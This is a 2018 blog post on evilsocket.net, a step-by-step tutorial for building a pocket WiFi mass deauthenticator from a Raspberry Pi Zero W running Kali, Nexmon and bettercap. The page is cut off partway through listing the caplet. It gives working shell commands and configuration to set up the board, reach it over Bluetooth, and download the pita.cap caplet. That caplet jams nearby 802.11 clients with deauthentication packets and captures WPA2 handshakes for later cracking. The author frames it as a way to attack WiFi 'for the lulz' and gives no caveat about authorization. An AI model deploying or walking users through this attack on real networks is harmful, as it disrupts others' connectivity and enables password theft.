<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="A few days ago I started playing with some idea I had from a few weeks already, using a Raspberry Pi Zero W to make a mini WiFi deauthenticator: something in my pocket that periodically jumps on all t">
<meta property="og:type" content="article">
<meta property="og:title" content="Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W">
<meta property="og:url" content="https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/index.html">
<meta property="og:site_name" content="evilsocket">
<meta property="og:description" content="A few days ago I started playing with some idea I had from a few weeks already, using a Raspberry Pi Zero W to make a mini WiFi deauthenticator: something in my pocket that periodically jumps on all t">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://www.evilsocket.net/images/2018/07/deauth.png">
<meta property="og:image" content="https://www.evilsocket.net/images/2018/07/bt.png">
<meta property="og:image" content="https://www.evilsocket.net/images/2018/07/net1.png">
<meta property="og:image" content="https://www.evilsocket.net/images/2018/07/net2.png">
<meta property="og:image" content="https://www.evilsocket.net/images/2018/07/victim.png">
<meta property="og:image" content="https://abs.twimg.com/emoji/v2/72x72/1f984.png">
<meta property="article:published_time" content="2018-07-28T17:01:56.000Z">
<meta property="article:modified_time" content="2021-03-01T16:07:13.000Z">
<meta property="article:author" content="Simone Margaritelli">
<meta property="article:tag" content="bettercap">
<meta property="article:tag" content="wifi">
<meta property="article:tag" content="ble">
<meta property="article:tag" content="bluetooth">
<meta property="article:tag" content="raspberry">
<meta property="article:tag" content="rpi">
<meta property="article:tag" content="rpi zero w">
<meta property="article:tag" content="rpi0w">
<meta property="article:tag" content="kali">
<meta property="article:tag" content="deauth">
<meta property="article:tag" content="btnap">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://www.evilsocket.net/images/2018/07/deauth.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon.ico" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico">
          
        
    
    <!-- title -->
    <title>Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="evilsocket" type="application/atom+xml" />
    
<meta name="generator" content="Hexo 5.4.2"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">~/</a></li>
         
          <li><a href="/atom.xml">rss</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2018/11/22/Presenting-project-Ergo-how-to-build-an-airplane-detector-for-satellite-imagery-with-Deep-Learning/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2018/03/14/Go-is-amazing-so-here-s-what-i-don-t-like-about-it/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/&text=Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/&title=Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/&is_video=false&description=Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W&body=Check out this article: https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/&title=Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/&title=Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/&title=Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/&title=Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://www.evilsocket.net/2018/07/28/Project-PITA-Writeup-build-a-mini-mass-deauther-using-bettercap-and-a-Raspberry-Pi-Zero-W/&name=Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W&description=&lt;p&gt;A few days ago I started playing with some idea I had from a few weeks already, using a Raspberry Pi Zero W to make a mini WiFi deauthenticator: something in my pocket that periodically jumps on all the channels in the WiFi spectrum, collects information about the nearby access points and their connected clients and then sends a deauthentication packet to each one of them, resulting in some sort of WiFi jammer on the 802.11 level. As an interesting ‚Äúside effect‚Äù of this jammer (the initial intent was &lt;em&gt;purely for the lulz&lt;/em&gt;) is that the more it deauths, the higher the changes to also sniff WPA2 handshakes.&lt;/p&gt;
&lt;p&gt;Thanks to the awesome work of the Kali and Nexmon communities in packaging the nexmon drivers and utilities and to the recent changes we released in bettercap, this was very easy to setup and to script and given &lt;a href=&#34;https://twitter.com/evilsocket/status/1021367629901115392&#34;&gt;the interest the tweet had&lt;/a&gt; I thought to share this writeup :)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/images/2018/07/deauth.png&#34; alt=&#34;deauth&#34;&gt;&lt;/p&gt;
&lt;center&gt;&lt;small&gt;&lt;i&gt;This awesome case has been designed by &lt;a href=&#34;https://twitter.com/elkentaro&#34; target=&#34;_blank&#34;&gt;@elkentaro&lt;/a&gt; and can be found on [his Thingverse page](https://www.thingiverse.com/thing:3018480).&lt;/i&gt;&lt;/small&gt;&lt;/center&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-FAQ"><span class="toc-number">1.</span> <span class="toc-text">[0x00] FAQ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-Kali-image-and-initial-headless-configuration"><span class="toc-number">2.</span> <span class="toc-text">[0x01] Kali image and initial headless configuration.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-Having-fun-with-wlan0-and-bettercap"><span class="toc-number">3.</span> <span class="toc-text">[0x03] Having fun with wlan0 and bettercap</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline" style="text-transform: uppercase;">
        Project PITA: Build a Mini Mass Deauther Using Bettercap and a Raspberry Pi Zero W
    </h1>



    <div class="meta">
      
    <div class="postdate">
        <time datetime="2018-07-28T17:01:56.000Z" itemprop="datePublished">2018-07-28</time>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/bettercap/" rel="tag">bettercap</a>, <a class="tag-link-link" href="/tags/ble/" rel="tag">ble</a>, <a class="tag-link-link" href="/tags/bluetooth/" rel="tag">bluetooth</a>, <a class="tag-link-link" href="/tags/btnap/" rel="tag">btnap</a>, <a class="tag-link-link" href="/tags/deauth/" rel="tag">deauth</a>, <a class="tag-link-link" href="/tags/kali/" rel="tag">kali</a>, <a class="tag-link-link" href="/tags/raspberry/" rel="tag">raspberry</a>, <a class="tag-link-link" href="/tags/rpi/" rel="tag">rpi</a>, <a class="tag-link-link" href="/tags/rpi-zero-w/" rel="tag">rpi zero w</a>, <a class="tag-link-link" href="/tags/rpi0w/" rel="tag">rpi0w</a>, <a class="tag-link-link" href="/tags/wifi/" rel="tag">wifi</a>
    </div>


    </div>

    <div class="addthis_sharing_toolbox"></div>
  </header>

    <br/>
  

  <div class="content" itemprop="articleBody">
    <p>A few days ago I started playing with some idea I had from a few weeks already, using a Raspberry Pi Zero W to make a mini WiFi deauthenticator: something in my pocket that periodically jumps on all the channels in the WiFi spectrum, collects information about the nearby access points and their connected clients and then sends a deauthentication packet to each one of them, resulting in some sort of WiFi jammer on the 802.11 level. As an interesting ‚Äúside effect‚Äù of this jammer (the initial intent was <em>purely for the lulz</em>) is that the more it deauths, the higher the changes to also sniff WPA2 handshakes.</p>
<p>Thanks to the awesome work of the Kali and Nexmon communities in packaging the nexmon drivers and utilities and to the recent changes we released in bettercap, this was very easy to setup and to script and given <a target="_blank" rel="noopener" href="https://twitter.com/evilsocket/status/1021367629901115392">the interest the tweet had</a> I thought to share this writeup :)</p>
<p><img src="/images/2018/07/deauth.png" alt="deauth"></p>
<center><small><i>This awesome case has been designed by <a href="https://twitter.com/elkentaro" target="_blank">@elkentaro</a> and can be found on [his Thingverse page](https://www.thingiverse.com/thing:3018480).</i></small></center>

<span id="more"></span>

<h3 id="0x00-FAQ"><a href="#0x00-FAQ" class="headerlink" title="[0x00] FAQ"></a>[0x00] FAQ</h3><p><strong>Why not using Nethunter or some other Kali image for Android and a smartphone instead?</strong></p>
<p>Monitor mode works, injection doesn‚Äôt. Using an external WiFi makes the whole thing bigger and kills the battery.</p>
<p><strong>Why not using ‚Ä¶ instead?</strong></p>
<p>There are many alternatives to the setup I‚Äôm going to describe, it‚Äôs not necessarily the best, just the one that works for me.</p>
<p><strong>Why ‚Ä¶?</strong></p>
<p>BECAUSE. The point of this post is not just the hardware, but mostly how to use bettercap to attack wifi.</p>
<h3 id="0x01-Kali-image-and-initial-headless-configuration"><a href="#0x01-Kali-image-and-initial-headless-configuration" class="headerlink" title="[0x01] Kali image and initial headless configuration."></a>[0x01] Kali image and initial headless configuration.</h3><p>First thing first, you‚Äôll need to download the <strong>Kali Linux Rpi0w Nexmon</strong> image from <a target="_blank" rel="noopener" href="https://www.offensive-security.com/kali-linux-arm-images/">this page</a> and burn it to the uSD card you‚Äôre going to use for the rpi using the usual <code>dd</code> method, but before unmounting it, we need to enable SSH at boot and configure it to connect to our home WiFi network for the initial configuration, keep in mind this is just temporary and the main wifi interface will be used for packet injection later, while we will be able to connect via bluetooth to the board.</p>
<p>From the computer you used to burn the image on your micro sd, mount it again if needed and then:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># this will enable ssh at boot</span></span><br><span class="line">touch /sd-mount-point/boot/ssh</span><br><span class="line"><span class="comment"># let&#x27;s setup wlan0</span></span><br><span class="line">nano /sd-mount-point/etc/network/interfaces</span><br></pre></td></tr></table></figure>

<p>Fill this file with the following contents:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">auto lo</span><br><span class="line"></span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line">allow-hotplug wlan0</span><br><span class="line">iface wlan0 inet dhcp</span><br><span class="line">wpa-conf &#x2F;etc&#x2F;wpa_supplicant&#x2F;wpa_supplicant.conf</span><br><span class="line">iface default inet dhcp</span><br></pre></td></tr></table></figure>

<p>Now we‚Äôll add the details of the WiFi network we want the rpi to connect automatically for configuration:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano /sd-mount-point/etc/wpa_supplicant/wpa_supplicant.conf</span><br></pre></td></tr></table></figure>

<p>And add this:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">country&#x3D;GB</span><br><span class="line">ctrl_interface&#x3D;DIR&#x3D;&#x2F;var&#x2F;run&#x2F;wpa_supplicant GROUP&#x3D;netdev</span><br><span class="line">update_config&#x3D;1</span><br><span class="line"></span><br><span class="line">network&#x3D;&#123;</span><br><span class="line">        ssid&#x3D;&quot;YourWiFiName&quot;</span><br><span class="line">        psk&#x3D;&quot;y0urw1f!p455w0rd&quot;</span><br><span class="line">        key_mgmt&#x3D;WPA-PSK</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Reboot the RPI and it should connect to your WiFi, search for its IP address (either by broadcast ping, or using bettercap itself, i usually use the <a target="_blank" rel="noopener" href="https://github.com/bettercap/caplets/blob/master/netmon.cap">netmon</a> caplet to see what‚Äôs going on on my network) and finally SSH to it using the default Kali credentials:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># this will allow you to login with your SSH key instead of a password</span></span><br><span class="line">ssh-copy-id -i ~/.ssh/id_rsa.pub root@pita-ip</span><br><span class="line">ssh root@pita-ip</span><br></pre></td></tr></table></figure>

<p>Once you‚Äôre logged in:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># always change the default root password</span></span><br><span class="line">passwd</span><br><span class="line"><span class="comment"># regenerate ssh keys</span></span><br><span class="line">ssh-keygen</span><br><span class="line"><span class="comment"># set a nicer hostname :D</span></span><br><span class="line">hostname -b pita</span><br><span class="line"><span class="built_in">echo</span> pita &gt; /etc/hostname</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;127.0.0.1 pita&quot;</span> &gt;&gt; /etc/hosts</span><br><span class="line"><span class="comment"># update the system</span></span><br><span class="line">apt update </span><br><span class="line">apt upgrade</span><br><span class="line"><span class="comment"># install a few useful packages and setup swap</span></span><br><span class="line">apt install git dphys-swapfile</span><br><span class="line"><span class="comment"># set CONF_SWAPSIZE to 1024</span></span><br><span class="line">nano /etc/dphys-swapfile</span><br><span class="line">systemctl <span class="built_in">enable</span> dphys-swapfile</span><br><span class="line"><span class="comment"># set the correct timezone</span></span><br><span class="line">dpkg-reconfigure tzdata</span><br><span class="line"><span class="comment"># reboot to apply the effects</span></span><br><span class="line">reboot```</span><br><span class="line"></span><br><span class="line"><span class="comment">### [0x02] Connecting via Bluetooth with bt-nap</span></span><br><span class="line"></span><br><span class="line">We want to use `wlan0` <span class="keyword">for</span> the monitor mode and injection using Nexmon, meaning we need another way to connect to our board. For this, we can setup the rpi to work as a bt-nap server, basically you will be able to connect via bluetooth and reach it with an IP address on that bluetooth connection, this works both from a laptop and from a smartphone as well.</span><br><span class="line"></span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;blockquote class=<span class="string">&quot;twitter-tweet&quot;</span> data-conversation=<span class="string">&quot;none&quot;</span> data-lang=<span class="string">&quot;it&quot;</span>&gt;&lt;p lang=<span class="string">&quot;en&quot;</span> dir=<span class="string">&quot;ltr&quot;</span>&gt;Power from your smartphone, ssh over bluetooth and a mass deauther <span class="keyword">in</span> your pocket üòà&lt;a href=<span class="string">&quot;https://twitter.com/bettercap?ref_src=twsrc%5Etfw&quot;</span>&gt;@bettercap&lt;/a&gt; + &lt;a href=<span class="string">&quot;https://twitter.com/hashtag/pita?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;</span>&gt;<span class="comment">#pita&lt;/a&gt; = ‚ù§Ô∏è &lt;a href=&quot;https://t.co/lDn9Tie3W9&quot;&gt;pic.twitter.com/lDn9Tie3W9&lt;/a&gt;&lt;/p&gt;&amp;mdash; üëΩ (@evilsocket) &lt;a href=&quot;https://twitter.com/evilsocket/status/1021378841749721091?ref_src=twsrc%5Etfw&quot;&gt;23 luglio 2018&lt;/a&gt;&lt;/blockquote&gt;</span></span><br><span class="line">&lt;script async src=<span class="string">&quot;https://platform.twitter.com/widgets.js&quot;</span> charset=<span class="string">&quot;utf-8&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line"></span><br><span class="line">Let<span class="string">&#x27;s connect once more via WiFi and SSH:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">```sh</span></span><br><span class="line"><span class="string">ssh root@pita-ip</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># install a few dependencies</span></span><br><span class="line"><span class="string">apt install pulseaudio pulseaudio-module-zeroconf alsa-utils avahi-daemon pulseaudio-module-bluetooth</span></span><br><span class="line"><span class="string">git clone https://github.com/bablokb/pi-btnap.git</span></span><br><span class="line"><span class="string"># install btnap as a server</span></span><br><span class="line"><span class="string">./pi-btnap/tools/install-btnap server</span></span><br></pre></td></tr></table></figure>

<p>Fix the bluetooth configuration file <code>/etc/systemd/system/bluetooth.target.wants/bluetooth.service</code> by disabling the SAP plugin that would break bluetooth, change the <code>ExecStart</code> part with:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExecStart&#x3D;&#x2F;usr&#x2F;lib&#x2F;bluetooth&#x2F;bluetoothd --noplugin&#x3D;sap</span><br></pre></td></tr></table></figure>

<p>Let‚Äôs set the bluetooth name of your device by editing <code>/etc/bluetooth/main.conf</code> and finally edit the btnap configuration file itself, <code>/etc/btnap.conf</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MODE&#x3D;&quot;server&quot;</span><br><span class="line">BR_DEV&#x3D;&quot;br0&quot;</span><br><span class="line">BR_IP&#x3D;&quot;192.168.20.99&#x2F;24&quot;</span><br><span class="line">BR_GW&#x3D;&quot;192.168.20.1&quot; </span><br><span class="line">ADD_IF&#x3D;&quot;lo&quot; </span><br><span class="line">REMOTE_DEV&#x3D;&quot;&quot; </span><br><span class="line">DEBUG&#x3D;&quot;&quot;</span><br></pre></td></tr></table></figure>

<p>Enable all the services at boot and restart them:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> bluetooth</span><br><span class="line">systemctl <span class="built_in">enable</span> btnap</span><br><span class="line">systemctl <span class="built_in">enable</span> dnsmasq</span><br><span class="line"></span><br><span class="line">service bluetooth restart</span><br><span class="line">service dnsmasq restart</span><br><span class="line">service btnap restart</span><br></pre></td></tr></table></figure>

<p>Before being able to connect via bluetooth, we need to manually pair and trust the device we‚Äôre going to use (remember to repeat this step for every new device you want to allow to connect to the PITA board), make sure your control device (your laptop for instance) has bluetooth enabled and it‚Äôs visible, then from the pita:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bluetoothctl</span><br><span class="line">&gt; agent on</span><br><span class="line">&gt; scan on</span><br><span class="line">... <span class="built_in">wait</span> <span class="keyword">for</span> your device to show up ...</span><br><span class="line">...</span><br><span class="line">... now pair with its address</span><br><span class="line">&gt; pair aa:bb:cc:dd:ee:ff</span><br><span class="line">... and trust it permantently ...</span><br><span class="line">&gt; trust aa:bb:cc:dd:ee:ff</span><br><span class="line">... <span class="built_in">wait</span> ...</span><br><span class="line">&gt; quit</span><br></pre></td></tr></table></figure>

<p>We‚Äôre now ready to ‚Äúfree‚Äù the wlan0 interface and use it for more cool stuff, let‚Äôs change the file <code>/etc/network/interfaces</code> to:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line">allow-hotplug wlan0</span><br><span class="line">iface wlan0 inet static</span><br></pre></td></tr></table></figure>

<p>From the board now, disable wpa_supplicant and reboot:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service wpa_supplicant <span class="built_in">disable</span></span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>

<p>After reboot, you‚Äôll be able to connect to the board via bluetooth.</p>
<p><img src="/images/2018/07/bt.png" alt="bt"></p>
<p>Your system (this depends on the system you‚Äôre using, on most GNU/Linux distributions and Android this is basically automatically detected) should now have a new DHCP based <code>Pita Network</code> entry in the network manager:</p>
<p><img src="/images/2018/07/net1.png" alt="pita network"></p>
<p>Once connected, you should see a new <code>bnep0</code> network interface:</p>
<p><img src="/images/2018/07/net2.png" alt="ifconfig"></p>
<p>You can finally ssh to your PITA board via bluetooth now :)</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;192.168.20.99 pita&quot;</span> &gt;&gt; /etc/hosts</span><br><span class="line">ssh root@pita</span><br></pre></td></tr></table></figure>

<h3 id="0x03-Having-fun-with-wlan0-and-bettercap"><a href="#0x03-Having-fun-with-wlan0-and-bettercap" class="headerlink" title="[0x03] Having fun with wlan0 and bettercap"></a>[0x03] Having fun with wlan0 and bettercap</h3><p><strong>IMPORTANT</strong></p>
<p><strong>In order to install bettercap and download the caplet, you will need internet connectivity on the rpi, but we just freed wlan0 for injection, so you‚Äôll either have to plug some ethernet adapter, smartphone in tethering mode, etc on the mini usb port now, or perform these steps while the board is still connected to your WiFi during section 0x01.</strong></p>
<p>Now that we can power our board either from a powerbank or the smartphone itself and we can connect to it via SSH over bluetooth, the next step is to install bettercap itself, we will compile it directly on the PITA, it‚Äôll take a while but it‚Äôs very easy:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">apt install golang libpcap-dev libnetfilter-queue-dev wget build-essential</span><br><span class="line"><span class="comment"># you should make this persistent in your .bashrc or .zshrc file</span></span><br><span class="line"><span class="built_in">export</span> GOPATH=/root/gocode</span><br><span class="line">mkdir -p <span class="variable">$GOPATH</span></span><br><span class="line">go get github.com/bettercap/bettercap</span><br><span class="line"><span class="comment"># wait</span></span><br><span class="line"><span class="comment"># let&#x27;s install it for everyone to enjoy ^_^</span></span><br><span class="line"><span class="built_in">cd</span> /root/gocode/src/github.com/bettercap/bettercap</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"><span class="comment"># let&#x27;s download the pita.cap caplet</span></span><br><span class="line"><span class="built_in">cd</span> /usr/share/bettercap/caplets/</span><br><span class="line">wget <span class="string">&quot;https://raw.githubusercontent.com/bettercap/caplets/master/pita.cap&quot;</span></span><br></pre></td></tr></table></figure>

<p>The <a target="_blank" rel="noopener" href="https://github.com/bettercap/caplets/blob/master/pita.cap">pita.cap</a> caplet will take care of starting wlan0 in monitor mode, periodically send deauth packets and also sniffing for WPA2 handshakes as they arrive, you can launch it and keep it persistent with something like screen or tmux. It is a basic example of what you can do now, many other functionalities can be found in the <a target="_blank" rel="noopener" href="https://github.com/bettercap/caplets">caplets repo</a> and generally in the project <a target="_blank" rel="noopener" href="https://github.com/bettercap/bettercap/wiki">wiki</a>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># More info about this caplet: https:&#x2F;&#x2F;twitter.com&#x2F;evilsocket&#x2F;status&#x2F;1021367629901115392</span><br><span class="line"></span><br><span class="line">set $ &#123;bold&#125;üòà ¬ª &#123;reset&#125;</span><br><span class="line"></span><br><span class="line"># make sure wlan0 is in monitor mode</span><br><span class="line"># ref: https:&#x2F;&#x2F;github.com&#x2F;offensive-security&#x2F;kali-arm-build-scripts&#x2F;blob&#x2F;master&#x2F;rpi3-nexmon.sh</span><br><span class="line">!monstop</span><br><span class="line">!monstart</span><br><span class="line"></span><br><span class="line"># every 5 seconds:</span><br><span class="line"># - clear the screen</span><br><span class="line"># - show the list of 